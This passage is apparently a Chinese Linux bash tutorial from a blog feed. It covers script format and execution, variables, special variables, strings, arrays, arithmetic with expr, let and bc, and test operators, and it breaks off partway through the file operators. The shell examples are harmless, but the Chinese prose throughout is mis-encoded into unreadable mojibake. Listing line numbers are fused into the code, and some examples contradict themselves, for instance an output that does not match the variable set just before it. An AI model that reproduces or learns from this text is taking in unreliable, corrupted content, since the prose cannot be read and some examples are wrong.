    <content type="text"><![CDATA[1ã€Linux shellç®€ä»‹1.1ã€Shellæ¦‚è¿°Shellæœ¬èº«æ˜¯ä¸€ä¸ªç”¨Cè¯­è¨€ç¼–å†™çš„ç¨‹åºï¼Œå®ƒæ˜¯ç”¨æˆ·ä½¿ç”¨Unix/Linuxçš„æ¡¥æ¢ï¼Œç”¨æˆ·çš„å¤§éƒ¨åˆ†å·¥ä½œéƒ½æ˜¯é€šè¿‡Shellå®Œæˆçš„ã€‚ Shellæ—¢æ˜¯ä¸€ç§å‘½ä»¤è¯­è¨€ï¼Œåˆæ˜¯ä¸€ç§ç¨‹åºè®¾è®¡è¯­è¨€ï¼š ä½œä¸ºå‘½ä»¤è¯­è¨€ï¼Œå®ƒäº¤äº’å¼åœ°è§£é‡Šå’Œæ‰§è¡Œç”¨æˆ·è¾“å…¥çš„å‘½ä»¤ï¼› ä½œä¸ºç¨‹åºè®¾è®¡è¯­è¨€ï¼Œå®ƒå®šä¹‰äº†å„ç§å˜é‡å’Œå‚æ•°ï¼Œå¹¶æä¾›äº†è®¸å¤šåœ¨é«˜çº§è¯­è¨€ä¸­æ‰å…·æœ‰çš„æ§åˆ¶ç»“æ„ï¼ŒåŒ…æ‹¬å¾ªç¯å’Œåˆ†æ”¯ã€‚ Shellå®ƒè™½ç„¶ä¸æ˜¯Unix/Linuxç³»ç»Ÿå†…æ ¸çš„ä¸€éƒ¨åˆ†ï¼Œä½†å®ƒè°ƒç”¨äº†ç³»ç»Ÿæ ¸å¿ƒçš„å¤§éƒ¨åˆ†åŠŸèƒ½æ¥æ‰§è¡Œç¨‹åºã€å»ºç«‹æ–‡ä»¶å¹¶ä»¥å¹¶è¡Œçš„æ–¹å¼åè°ƒå„ä¸ªç¨‹åºçš„è¿è¡Œã€‚Shellæ˜¯ç”¨æˆ·ä¸å†…æ ¸è¿›è¡Œäº¤äº’æ“ä½œçš„ä¸€ç§æ¥å£ï¼Œç›®å‰æœ€æµè¡Œçš„Shellç§°ä¸ºbash Shellï¼ˆBourne Again Shellï¼‰ Shellæ˜¯ä¸€é—¨ç¼–ç¨‹è¯­è¨€(è§£é‡Šå‹çš„ç¼–ç¨‹è¯­è¨€)ï¼Œå³shellè„šæœ¬(å°±æ˜¯åœ¨ç”¨linuxçš„shellå‘½ä»¤ç¼–ç¨‹)ï¼ŒShellè„šæœ¬ç¨‹åºä»è„šæœ¬ä¸­ä¸€è¡Œä¸€è¡Œè¯»å–å¹¶æ‰§è¡Œè¿™äº›å‘½ä»¤ï¼Œç›¸å½“äºä¸€ä¸ªç”¨æˆ·æŠŠè„šæœ¬ä¸­çš„å‘½ä»¤ä¸€è¡Œä¸€è¡Œæ•²åˆ°Shellæç¤ºç¬¦ä¸‹æ‰§è¡Œ Shellæ˜¯ä¸€ç§è„šæœ¬è¯­è¨€ï¼Œé‚£ä¹ˆï¼Œå°±å¿…é¡»æœ‰è§£é‡Šå™¨æ¥æ‰§è¡Œè¿™äº›è„šæœ¬ Unix/Linuxä¸Šå¸¸è§çš„Shellè„šæœ¬è§£é‡Šå™¨æœ‰bashã€shã€cshã€kshç­‰ï¼Œä¹ æƒ¯ä¸ŠæŠŠå®ƒä»¬ç§°ä½œä¸€ç§Shellã€‚æˆ‘ä»¬å¸¸è¯´æœ‰å¤šå°‘ç§Shellï¼Œå…¶å®è¯´çš„æ˜¯Shellè„šæœ¬è§£é‡Šå™¨ï¼Œå¯ä»¥é€šè¿‡cat /etc/shellså‘½ä»¤æŸ¥çœ‹ç³»ç»Ÿä¸­å®‰è£…çš„shellï¼Œä¸åŒçš„shellå¯èƒ½æ”¯æŒçš„å‘½ä»¤è¯­æ³•æ˜¯ä¸ç›¸åŒçš„ shæ˜¯Unix æ ‡å‡†é»˜è®¤çš„shellï¼Œç”±Steve Bourneå¼€å‘ï¼Œæ˜¯Bourne Shellçš„ç¼©å†™ã€‚ bashæ˜¯Linuxæ ‡å‡†é»˜è®¤çš„shellï¼Œæœ¬æ•™ç¨‹ä¹ŸåŸºäºbashè®²è§£ã€‚bashç”±Brian Foxå’ŒChet Rameyå…±åŒå®Œæˆï¼Œæ˜¯Bourne Again Shellçš„ç¼©å†™ã€‚ Shellæœ¬èº«æ”¯æŒçš„å‘½ä»¤å¹¶ä¸å¤šï¼Œå†…éƒ¨å‘½ä»¤ä¸€å…±æœ‰40ä¸ªï¼Œä½†æ˜¯å®ƒå¯ä»¥è°ƒç”¨å…¶ä»–çš„ç¨‹åºï¼Œæ¯ä¸ªç¨‹åºå°±æ˜¯ä¸€ä¸ªå‘½ä»¤ï¼Œè¿™ä½¿å¾—Shellå‘½ä»¤çš„æ•°é‡å¯ä»¥æ— é™æ‰©å±•ï¼Œå…¶ç»“æœå°±æ˜¯Shellçš„åŠŸèƒ½éå¸¸å¼ºå¤§ï¼Œå®Œå…¨èƒ½å¤Ÿèƒœä»»Linuxçš„æ—¥å¸¸ç®¡ç†å·¥ä½œï¼Œå¦‚æ–‡æœ¬æˆ–å­—ç¬¦ä¸²æ£€ç´¢ã€æ–‡ä»¶çš„æŸ¥æ‰¾æˆ–åˆ›å»ºã€å¤§è§„æ¨¡è½¯ä»¶çš„è‡ªåŠ¨éƒ¨ç½²ã€æ›´æ”¹ç³»ç»Ÿè®¾ç½®ã€ç›‘æ§æœåŠ¡å™¨æ€§èƒ½ã€å‘é€æŠ¥è­¦é‚®ä»¶ã€æŠ“å–ç½‘é¡µå†…å®¹ã€å‹ç¼©æ–‡ä»¶ç­‰ã€‚ 1.2ã€ShellåŸºæœ¬æ ¼å¼ä»£ç å†™åœ¨æ™®é€šæ–‡æœ¬æ–‡ä»¶ä¸­ï¼Œé€šå¸¸ä»¥.shç»“å°¾ï¼Œè™½ç„¶ä¸æ˜¯å¼ºåˆ¶è¦æ±‚ï¼Œä½†å¸Œæœ›å¤§å®¶æœ€å¥½è¿™ä¹ˆåš 12345vi helloworld.sh--------------------------#!/bin/bash ## è¡¨ç¤ºç”¨å“ªä¸€ç§shellè§£æå™¨æ¥è§£ææ‰§è¡Œæˆ‘ä»¬çš„è¿™ä¸ªè„šæœ¬ç¨‹åºï¼Œè¿™å¥è¯åªå¯¹è‡ªæ‰§è¡Œæœ‰æ•ˆï¼Œå¯¹äºä½¿ç”¨sh helloworld.shæ— æ•ˆecho "hello world" ## æ³¨é‡Šä¹Ÿå¯ä»¥å†™åœ¨è¿™é‡Œ åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°±å†™å¥½äº†ä¸€ä¸ªshellè„šæœ¬ï¼Œç¬¬ä¸€è¡Œæ˜¯å›ºå®šéœ€è¦çš„ï¼Œè¡¨æ˜ç”¨å“ªä¸€ç§shellè§£æå™¨æ¥æ‰§è¡Œæˆ‘ä»¬çš„è¿™ä¸ªè„šæœ¬ç¨‹åºã€‚æœ¬è´¨ä¸Šï¼Œshellè„šæœ¬é‡Œé¢çš„ä»£ç éƒ½æ˜¯å°±æ˜¯ä¸€äº›æµç¨‹æ§åˆ¶è¯­å¥åŠ ä¸€äº›ç‰¹æ®Šè¯­æ³•å†åŠ shell**å‘½ä»¤**ç»„æˆã€‚å…¶ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å½“åšæ¯ä¸€ä¸ªå‘½ä»¤å°±æ˜¯shellç¼–ç¨‹å½“ä¸­çš„å…³é”®å­—ã€‚ 1.3ã€Shellæ‰§è¡Œæ–¹å¼1 ã€sh æ–¹å¼æˆ–è€…bash æ–¹å¼ sh helloworld.sh bash helloworld.sh ## ç›´æ¥æŒ‡å®šç”¨ç³»ç»Ÿé»˜è®¤çš„bash shellè§£é‡Šæ‰§è¡Œ 2 ã€source æ–¹å¼æˆ–è€…. æ–¹å¼ sourceå‘½ä»¤ä¹Ÿç§°ä¸ºâ€œç‚¹å‘½ä»¤â€ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªç‚¹ç¬¦å·ï¼ˆ.ï¼‰,æ˜¯bashçš„å†…éƒ¨å‘½ä»¤ã€‚ åŠŸèƒ½ï¼šä½¿Shellè¯»å…¥æŒ‡å®šçš„Shellç¨‹åºæ–‡ä»¶å¹¶ä¾æ¬¡æ‰§è¡Œæ–‡ä»¶ä¸­çš„æ‰€æœ‰è¯­å¥ sourceå‘½ä»¤é€šå¸¸ç”¨äºé‡æ–°æ‰§è¡Œåˆšä¿®æ”¹çš„åˆå§‹åŒ–æ–‡ä»¶ï¼Œä½¿ä¹‹ç«‹å³ç”Ÿæ•ˆï¼Œè€Œä¸å¿…æ³¨é”€å¹¶é‡æ–°ç™»å½•ã€‚ ç”¨æ³•ï¼š . helloworld.sh source helloworld.sh 3 ã€ç›´æ¥æ‰§è¡Œè¯¥è„šæœ¬æ–‡ä»¶ å¯ä»¥æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸è¿‡è¿™ä¸¤ç§æ–¹å¼çš„æ‰§è¡Œï¼Œéƒ½éœ€è¦è¯¥æ–‡ä»¶æœ‰æ‰§è¡Œæƒé™ æ‰€ä»¥åœ¨æ‰§è¡Œä¹‹å‰ï¼Œæˆ‘ä»¬è¦æ›´æ”¹ä»–çš„æ‰§è¡Œæƒé™ 1ã€ åˆ‡æ¢åˆ°è¯¥æ–‡ä»¶æ‰€åœ¨çš„è·¯å¾„ç„¶åæ‰§è¡Œå‘½ä»¤ï¼š ./helloworld.sh 2ã€ ç›´æ¥ä»¥ç»å¯¹è·¯å¾„æ–¹å¼æ‰§è¡Œ /home/linux/hellworld.sh 1.4ã€Shellæ³¨é‡Šå•è¡Œæ³¨é‡Šï¼šShellè„šæœ¬ä¸­ä»¥#å¼€å¤´çš„ä»£ç å°±æ˜¯æ³¨é‡Š # xxx å¤šè¡Œæ³¨é‡Šï¼šShellè„šæœ¬ä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨å¤šè¡Œæ³¨é‡Šï¼š:&lt;&lt;! xxx ! 2ã€ShellåŸºæœ¬è¯­æ³•2.1ã€å˜é‡2.1.1ã€ç³»ç»Ÿå˜é‡Linux Shellä¸­çš„å˜é‡åˆ†ä¸ºâ€œç³»ç»Ÿå˜é‡â€å’Œâ€œç”¨æˆ·è‡ªå®šä¹‰å˜é‡â€ ç³»ç»Ÿå˜é‡å¯ä»¥é€šè¿‡setå‘½ä»¤æŸ¥çœ‹ï¼Œç”¨æˆ·ç¯å¢ƒå˜é‡å¯ä»¥é€šè¿‡envæŸ¥çœ‹ï¼š å¸¸ç”¨ç³»ç»Ÿå˜é‡ï¼š\$PWD \$SHELL \$USER $HOME 2.1.2ã€è‡ªå®šä¹‰å˜é‡12345678910111213141516171819# 1.æ³¨æ„, å˜é‡ä¸­é—´ä¸èƒ½æœ‰ç©ºæ ¼A=123 echo $A# 2.å˜é‡ä¸­é—´æœ‰ç©ºæ ¼çš„è¯è¦åŠ å¼•å· - åŒå¼•å·ä¸­é—´å¯ä»¥å¼•ç”¨å˜é‡ a=zs b="this is $a" echo $b this is zs - å•å¼•å·å¼•ç”¨å˜é‡ä¼šåŸæ ·è¾“å‡º b='this is $a' echo $b this is $a # 3. è¦åœ¨å˜é‡åç›´æ¥è¿æ¥å­—ç¬¦, è¦ç”¨&#123;&#125;æŠŠå˜é‡æ‹¬èµ·æ¥ $&#123;å˜é‡å&#125;å…¶å®ƒå­—ç¬¦ echo $&#123;A&#125;ddd helloddd 2.1.3ã€å˜é‡é«˜çº§ç”¨æ³• æ’¤é”€å˜é‡ï¼šunset ABC å£°æ˜é™æ€å˜é‡ï¼šreadonly ABC= â€˜abcâ€™ ç‰¹ç‚¹æ˜¯è¿™ç§å˜é‡æ˜¯åªè¯»çš„ï¼Œä¸èƒ½unset åœ¨ä¸€ä¸ª .sh ä¸­. ä»¥ç»å¯¹è·¯å¾„çš„å½¢å¼è°ƒå¦ä¸€ä¸ª .sh ä½¿ç”¨exportå…³é”®å­— export A=â€A in a.shâ€ æ„å‘³ç€æŠŠå˜é‡æå‡ä¸ºå½“å‰shell è¿›ç¨‹ä¸­çš„å…¨å±€ç¯å¢ƒå˜é‡ï¼Œå¯ä¾›å…¶ä»–å­shell ç¨‹åºä½¿ç”¨ï¼Œ A å˜é‡å°±æˆäº†a.sh è„šæœ¬æ‰€åœ¨bash è¿›ç¨‹çš„å…¨å±€å˜é‡ï¼Œè¯¥è¿›ç¨‹çš„æ‰€æœ‰å­è¿›ç¨‹éƒ½èƒ½è®¿é—®åˆ°å˜é‡A é€šè¿‡ . /root/bin/b.sh æˆ– source /root/bin/b.sh æ¥è°ƒç”¨ æ€»ç»“ï¼š a.shä¸­ç›´æ¥è°ƒç”¨b.shï¼Œä¼šè®©b.shåœ¨Aæ‰€åœ¨çš„bashè¿›ç¨‹çš„â€œå­è¿›ç¨‹â€ç©ºé—´ä¸­æ‰§è¡Œ è€Œå­è¿›ç¨‹ç©ºé—´åªèƒ½è®¿é—®çˆ¶è¿›ç¨‹ä¸­ç”¨exportå®šä¹‰çš„å˜é‡ ä¸€ä¸ªshellè¿›ç¨‹æ— æ³•å°†è‡ªå·±å®šä¹‰çš„å˜é‡æå‡åˆ°çˆ¶è¿›ç¨‹ç©ºé—´ä¸­å» sourceæˆ–è€…â€œ.â€å·æ‰§è¡Œè„šæœ¬æ—¶ï¼Œä¼šè®©è„šæœ¬åœ¨è°ƒç”¨è€…æ‰€åœ¨çš„shellè¿›ç¨‹ç©ºé—´ä¸­æ‰§è¡Œ 2.1.4ã€åå¼•å·èµ‹å€¼ a=`ls -l /root/bin` ##åå¼•å·ï¼Œè¿è¡Œé‡Œé¢çš„å‘½ä»¤ï¼Œå¹¶æŠŠç»“æœè¿”å›ç»™å˜é‡a å¦å¤–ä¸€ç§å†™æ³•ï¼ša=$(ls -l /root/bin) 2.1.5ã€å˜é‡æœ‰ç”¨æŠ€å·§ å½¢å¼ è¯´æ˜ ${var} å˜é‡æœ¬æ¥çš„å€¼ ${var:-word} å¦‚æœå˜é‡ var ä¸ºç©ºæˆ–å·²è¢«åˆ é™¤(unset)ï¼Œé‚£ä¹ˆè¿”å› wordï¼Œä½†ä¸æ”¹å˜ var çš„å€¼ ${var:+word} å¦‚æœå˜é‡ var è¢«å®šä¹‰ï¼Œé‚£ä¹ˆè¿”å›wordï¼Œä½†ä¸æ”¹å˜ var çš„å€¼ ${var:=word} å¦‚æœå˜é‡ var ä¸ºç©ºæˆ–å·²è¢«åˆ é™¤(unset)ï¼Œé‚£ä¹ˆè¿”å› wordï¼Œå¹¶å°† var çš„å€¼è®¾ç½®ä¸º word ${var:?message} å¦‚æœå˜é‡ var ä¸ºç©ºæˆ–å·²è¢«åˆ é™¤(unset)ï¼Œé‚£ä¹ˆå°†æ¶ˆæ¯ message é€åˆ°æ ‡å‡†é”™è¯¯è¾“å‡ºï¼Œå¯ä»¥ç”¨æ¥æ£€æµ‹å˜é‡ var æ˜¯å¦å¯ä»¥è¢«æ­£å¸¸èµ‹å€¼ã€‚ è‹¥æ­¤æ›¿æ¢å‡ºç°åœ¨Shellè„šæœ¬ä¸­ï¼Œé‚£ä¹ˆè„šæœ¬å°†åœæ­¢è¿è¡Œ 2.1.6 ç‰¹æ®Šå˜é‡ $? è¡¨ç¤ºä¸Šä¸€ä¸ªå‘½ä»¤é€€å‡ºçš„çŠ¶æ€ç  $$ è¡¨ç¤ºå½“å‰è¿›ç¨‹ç¼–å· $0 è¡¨ç¤ºå½“å‰è„šæœ¬åç§° $n è¡¨ç¤ºn ä½ç½®çš„è¾“å…¥å‚æ•°ï¼ˆn**ä»£è¡¨æ•°å­—ï¼Œn&gt;=1 ï¼‰** $# è¡¨ç¤ºå‚æ•°çš„ä¸ªæ•°ï¼Œå¸¸ç”¨äºå¾ªç¯ $* å’Œ$@ éƒ½è¡¨ç¤ºå‚æ•°åˆ—è¡¨ æ³¨æ„ï¼š$*ä¸$@åŒºåˆ« $* å’Œ $@ éƒ½è¡¨ç¤ºä¼ é€’ç»™å‡½æ•°æˆ–è„šæœ¬çš„æ‰€æœ‰å‚æ•°** ä¸è¢«åŒå¼•å·â€ â€œåŒ…å«æ—¶ $* å’Œ $@ éƒ½ä»¥\$1 \$2 â€¦ \$n çš„å½¢å¼ç»„æˆå‚æ•°åˆ—è¡¨ å½“å®ƒä»¬è¢«åŒå¼•å·â€ â€œåŒ…å«æ—¶ â€œ$*â€œ ä¼šå°†æ‰€æœ‰çš„å‚æ•°ä½œä¸ºä¸€ä¸ªæ•´ä½“ï¼Œä»¥â€\$1 \$2 â€¦ \$nâ€çš„å½¢å¼ç»„æˆä¸€ä¸ªæ•´ä¸²ï¼› $* ä¼šå°†å„ä¸ªå‚æ•°åˆ†å¼€ï¼Œä»¥â€\$1â€ â€œ\$2â€ â€¦ â€œ\$nâ€ çš„å½¢å¼ç»„æˆä¸€ä¸ªå‚æ•°åˆ—è¡¨ 2.1.7 å˜é‡çš„å…¶ä»–æ³¨æ„ç‚¹ ä½¿ç”¨å˜é‡ ä½¿ç”¨ä¸€ä¸ªå®šä¹‰è¿‡çš„å˜é‡, åªéœ€è¦åœ¨å˜é‡åå‰é¢åŠ  $ ç¬¦å· å¦‚æœå˜é‡åé¢ç›´æ¥è·Ÿä¸Šäº†å­—ç¬¦ä¸², å°±å¿…é¡»è¦åŠ èŠ±æ‹¬å· æ¨èç»™æ‰€æœ‰å˜é‡åŠ ä¸ŠèŠ±æ‹¬å·, è¿™ä¸ªæ˜¯å¥½çš„ç¼–ç¨‹ä¹ æƒ¯ å·²å®šä¹‰çš„éåªè¯»å˜é‡, å¯ä»¥è¢«é‡æ–°å®šä¹‰ åªè¯»å˜é‡ ä½¿ç”¨ readonly å‘½ä»¤å¯ä»¥å°†å˜é‡å®šä¹‰ä¸ºåªè¯»å˜é‡ï¼Œåªè¯»å˜é‡çš„å€¼ä¸èƒ½è¢«æ”¹å˜ã€‚ 1234567#!/bin/bashmyUrl="http://www.w3cschool.cc"readonly myUrlmyUrl="http://www.runoob.com"---# ä¼šæŠ¥é”™zsh: read-only variable: myUrl åˆ é™¤å˜é‡, åªè¯»å˜é‡ä¸èƒ½åˆ é™¤, å˜é‡è¢«åˆ é™¤åä¸èƒ½å†æ¬¡ä½¿ç”¨ 1unset variable_name å˜é‡ç±»å‹ 1) å±€éƒ¨å˜é‡ å±€éƒ¨å˜é‡åœ¨è„šæœ¬æˆ–å‘½ä»¤ä¸­å®šä¹‰ï¼Œä»…åœ¨å½“å‰shellå®ä¾‹ä¸­æœ‰æ•ˆï¼Œå…¶ä»–shellå¯åŠ¨çš„ç¨‹åºä¸èƒ½è®¿é—®å±€éƒ¨å˜é‡ã€‚ 2) ç¯å¢ƒå˜é‡ æ‰€æœ‰çš„ç¨‹åºï¼ŒåŒ…æ‹¬shellå¯åŠ¨çš„ç¨‹åºï¼Œéƒ½èƒ½è®¿é—®ç¯å¢ƒå˜é‡ï¼Œæœ‰äº›ç¨‹åºéœ€è¦ç¯å¢ƒå˜é‡æ¥ä¿è¯å…¶æ­£å¸¸è¿è¡Œã€‚å¿…è¦çš„æ—¶å€™shellè„šæœ¬ä¹Ÿå¯ä»¥å®šä¹‰ç¯å¢ƒå˜é‡ã€‚ 3) shellå˜é‡ shellå˜é‡æ˜¯ç”±shellç¨‹åºè®¾ç½®çš„ç‰¹æ®Šå˜é‡ã€‚shellå˜é‡ä¸­æœ‰ä¸€éƒ¨åˆ†æ˜¯ç¯å¢ƒå˜é‡ï¼Œæœ‰ä¸€éƒ¨åˆ†æ˜¯å±€éƒ¨å˜é‡ï¼Œè¿™äº›å˜é‡ä¿è¯äº†shellçš„æ­£å¸¸è¿è¡Œ 2.18 å­—ç¬¦ä¸²è·å–å­—ç¬¦ä¸²é•¿åº¦12string="abcd"echo $&#123;#string&#125; #è¾“å‡º 4 æå–å­å­—ç¬¦ä¸²ä»¥ä¸‹å®ä¾‹ä»å­—ç¬¦ä¸²ç¬¬ 2 ä¸ªå­—ç¬¦å¼€å§‹æˆªå– 4 ä¸ªå­—ç¬¦ï¼š 12string="runoob is a great site"echo $&#123;string:1:4&#125; # è¾“å‡º unoo æŸ¥æ‰¾å­å­—ç¬¦ä¸²æŸ¥æ‰¾å­—ç¬¦ â€œi æˆ– sâ€œ çš„ä½ç½®ï¼š 12string="runoob is a great company"echo `expr index "$string" is` # è¾“å‡º 8 2.19 Shell æ•°ç»„ bashæ”¯æŒä¸€ç»´æ•°ç»„ï¼ˆä¸æ”¯æŒå¤šç»´æ•°ç»„ï¼‰ï¼Œå¹¶ä¸”æ²¡æœ‰é™å®šæ•°ç»„çš„å¤§å°ã€‚ ç±»ä¼¼ä¸Cè¯­è¨€ï¼Œæ•°ç»„å…ƒç´ çš„ä¸‹æ ‡ç”±0å¼€å§‹ç¼–å·ã€‚è·å–æ•°ç»„ä¸­çš„å…ƒç´ è¦åˆ©ç”¨ä¸‹æ ‡ï¼Œä¸‹æ ‡å¯ä»¥æ˜¯æ•´æ•°æˆ–ç®—æœ¯è¡¨è¾¾å¼ï¼Œå…¶å€¼åº”å¤§äºæˆ–ç­‰äº0ã€‚ å®šä¹‰æ•°ç»„åœ¨Shellä¸­ï¼Œç”¨æ‹¬å·æ¥è¡¨ç¤ºæ•°ç»„ï¼Œæ•°ç»„å…ƒç´ ç”¨â€ç©ºæ ¼â€ç¬¦å·åˆ†å‰²å¼€ã€‚å®šä¹‰æ•°ç»„çš„ä¸€èˆ¬å½¢å¼ä¸ºï¼š 1æ•°ç»„å=(å€¼1 å€¼2 ... å€¼n) è¿˜å¯ä»¥å•ç‹¬å®šä¹‰æ•°ç»„çš„å„ä¸ªåˆ†é‡ï¼š 123array_name[0]=value0array_name[1]=value1array_name[n]=valuen å¯ä»¥ä¸ä½¿ç”¨è¿ç»­çš„ä¸‹æ ‡ï¼Œè€Œä¸”ä¸‹æ ‡çš„èŒƒå›´æ²¡æœ‰é™åˆ¶ã€‚ è·å–æ•°ç»„çš„é•¿åº¦ è·å–æ•°ç»„é•¿åº¦çš„æ–¹æ³•ä¸è·å–å­—ç¬¦ä¸²é•¿åº¦çš„æ–¹æ³•ç›¸åŒï¼Œä¾‹å¦‚ï¼š 123456# å–å¾—æ•°ç»„å…ƒç´ çš„ä¸ªæ•°length=$&#123;#array_name[@]&#125;# æˆ–è€…length=$&#123;#array_name[*]&#125;# å–å¾—æ•°ç»„å•ä¸ªå…ƒç´ çš„é•¿åº¦lengthn=$&#123;#array_name[n]&#125; 2.2ã€è¿ç®—ç¬¦2.2.1ã€ç®—æ•°è¿ç®—ç¬¦1. ç”¨expr12345678æ ¼å¼ expr m + n æ³¨æ„exprè¿ç®—ç¬¦é—´è¦æœ‰ç©ºæ ¼ä¾‹å¦‚è®¡ç®—ï¼ˆ2ï¼‹3ï¼‰Ã—4 çš„å€¼1ã€åˆ†æ­¥è®¡ç®— S=`expr 2 + 3` expr $S \* 4 ## *å·éœ€è¦è½¬ä¹‰2ã€ä¸€æ­¥å®Œæˆè®¡ç®— expr `expr 2 + 3 ` \* 4 echo `expr \`expr 2 + 3\` \* 4` ç”¨exprè¿˜å¯ä»¥è®¡ç®—å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå­å­—ç¬¦ä¸²å‡ºç°çš„ä½ç½®ï¼Œæˆªå–å­—ç¬¦ä¸²ç­‰ç­‰ 123456789cts1 ~ # name='woshishuaige'cts1 ~ # expr length name4cts1 ~ # expr length $name12cts1 ~ # expr index $name shuai3cts1 ~ # expr substr $name 6 2sh è¯¦æƒ…è¯·ç¿»é˜…: expr â€“help 2. ç”¨(())12345678((1+2))(((2+3)*4))count=1((count++))((++count))echo $count# ä½†æ˜¯è¦æƒ³å–åˆ°è¿ç®—ç»“æœï¼Œéœ€è¦ç”¨$å¼•ç”¨a=$((1+2)) 3. ç”¨\$[]12345SS=$[2+3]echo $SSSS=$[2*3]echo $SSecho $[(2 + 3)*3] 4. ç”¨let1234first=1second=2let third=first+secondecho $&#123;third&#125; 5. ç”¨ | bcä»¥ä¸Šå‘½ä»¤éƒ½åªå¯¹æ•´å½¢æ•°å€¼æœ‰æ•ˆï¼Œä¸é€‚ç”¨äºæµ®ç‚¹æ•° å¦‚æœæœ‰æµ®ç‚¹æ•°å‚ä¸è¿ç®—ï¼Œå¯ä»¥å°†echoä¸bcå‘½ä»¤ç»“åˆèµ·æ¥ä½¿ç”¨ï¼Œä»£ç å¦‚ä¸‹ 123456echo "1.212*3" | bc ## ç®€å•æµ®ç‚¹è¿ç®—echo "scale=2;3/8" | bc ##å°†è¾“å‡ºç»“æœè®¾ç½®ä¸º2ä½echo "obase=2;127" | bc ##è¾“å‡ºè¿ç®—ç»“æœçš„äºŒè¿›åˆ¶echo "obase=10;ibase=2;101111111" | bc ##å°†äºŒè¿›åˆ¶è½¬æ¢æˆåè¿›åˆ¶echo "10^10" | bc ##æ±‚å¹‚æŒ‡æ•°echo "sqrt(100)" | bc ##å¼€å¹³æ–¹ é™¤äº†ç”¨bcåšå°½èŒè½¬æ¢ä»¥å¤–ï¼Œè¿˜å¯ä»¥è¿™æ ·åšï¼š 12345echo $((base#number)) è¡¨ç¤ºæŠŠä»»æ„baseè¿›åˆ¶çš„æ•°numberè½¬æ¢æˆåè¿›åˆ¶ä¾‹å­ï¼šecho $((8#377)) è¿”å›255echo $((025)) è¿”å›21 ï¼Œ å…«è¿›åˆ¶echo $((0xA4)) è¿”å›164 ï¼Œ åå…­è¿›åˆ¶ ä½¿ç”¨bcè¿˜å¯ä»¥ç”¨æ¥æ¯”è¾ƒæµ®ç‚¹æ•°çš„å¤§å°ï¼š 12345678910111213[root@hadoop02 bin]# echo "1.2 &lt; 2" |bc1[root@hadoop02 bin]# echo "1.2 &gt; 2" |bc0[root@hadoop02 bin]# echo "1.2 == 2.2" |bc0[root@hadoop02 bin]# echo "1.2 != 2.2" |bc1çœ‹å‡ºè§„å¾‹äº†å˜›ï¼Ÿè¿ç®—å¦‚æœä¸ºçœŸè¿”å› 1ï¼Œå¦åˆ™è¿”å› 0ï¼Œå†™ä¸€ä¸ªä¾‹å­ï¼š[root@hadoop02 bin]# [ $(echo "2.2 &gt; 2" |bc) -eq 1 ] &amp;&amp; echo yes || echo noyes[root@hadoop02 bin]# [ $(echo "2.2 &lt; 2" |bc) -eq 1 ] &amp;&amp; echo yes || echo nono 2.2.2ã€å…³ç³»è¿ç®—ç¬¦ä¸‹é¢ç»™å‡ºä¸€å¼ å…³ç³»è¿ç®—ç¬¦çš„åˆ—è¡¨ï¼š è¿ç®—ç¬¦ ç­‰åŒè¿ç®—ç¬¦ è¯´æ˜ -eq = æ£€æµ‹ä¸¤ä¸ªæ•°æ˜¯å¦ç›¸ç­‰ï¼Œç›¸ç­‰è¿”å›true -ne != æ£€æµ‹ä¸¤ä¸ªæ•°æ˜¯å¦ç›¸ç­‰ï¼Œä¸ç›¸ç­‰è¿”å›true -ge &gt;= æ£€æµ‹å·¦è¾¹çš„æ•°æ˜¯å¦å¤§ç­‰äºå³è¾¹çš„ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å›true -gt &gt; æ£€æµ‹å·¦è¾¹çš„æ•°æ˜¯å¦å¤§äºå³è¾¹çš„ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å›true -le &lt;= æ£€æµ‹å·¦è¾¹çš„æ•°æ˜¯å¦å°äºç­‰äºå³è¾¹çš„ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å›true -lt &lt; æ£€æµ‹å·¦è¾¹çš„æ•°æ˜¯å¦å°äºå³è¾¹çš„ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å›true 2.2.3ã€å¸ƒå°”è¿ç®—ç¬¦ è¿ç®—ç¬¦ ç­‰åŒè¿ç®—ç¬¦ è¯´æ˜ ! ! éè¿ç®—ï¼Œè¡¨è¾¾å¼ä¸º true åˆ™è¿”å›falseï¼Œå¦åˆ™è¿”å›true -a &amp;&amp; ä¸è¿ç®—ï¼Œä¸¤ä¸ªè¡¨è¾¾å¼éƒ½ä¸ºtrue æ‰è¿”å›true -o \ \ æˆ–è¿ç®—ï¼Œæœ‰ä¸€ä¸ªè¡¨è¾¾å¼ä¸ºtrue åˆ™è¿”å›true 2.2.4ã€å­—ç¬¦ä¸²è¿ç®—ç¬¦ è¿ç®—ç¬¦ è¯´æ˜ = æ£€æµ‹ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ï¼Œç›¸ç­‰è¿”å›true != æ£€æµ‹ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ï¼Œä¸ç›¸ç­‰è¿”å›true -z æ£€æµ‹å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦ä¸º0ï¼Œä¸º0è¿”å›true -n æ£€æµ‹å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦ä¸º0ï¼Œä¸ä¸º0è¿”å›true str æ£€æµ‹å­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºè¿”å›true 2.2.5ã€æ–‡ä»¶è¿ç®—ç¬¦ è¿ç®—ç¬¦ è¯´æ˜ -d æ£€æµ‹æ–‡ä»¶æ˜¯å¦æ˜¯ç›®å½•ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å›true -f æ£€æµ‹æ–‡ä»¶æ˜¯å¦æ˜¯æ™®é€šæ–‡ä»¶ï¼ˆæ—¢ä¸æ˜¯ç›®å½•ï¼Œä¹Ÿä¸æ˜¯è®¾å¤‡æ–‡ä»¶ï¼‰ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å›true -e 